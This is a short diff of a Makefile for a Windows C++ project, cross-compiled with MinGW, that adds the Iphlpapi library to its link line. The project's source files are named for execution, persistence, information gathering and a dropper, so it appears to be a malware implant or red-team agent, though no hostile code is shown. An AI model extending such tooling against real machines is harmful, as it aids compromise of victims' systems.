@@ -1,6 +1,6 @@
 MAC = x86_64-w64-mingw32-g++ 
 CXX = g++
-LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -static
+LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -lIphlpapi -static
 
 FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
 FILES2 = situational_awareness/GatherInfo.cpp dropper/Dropper.cpp
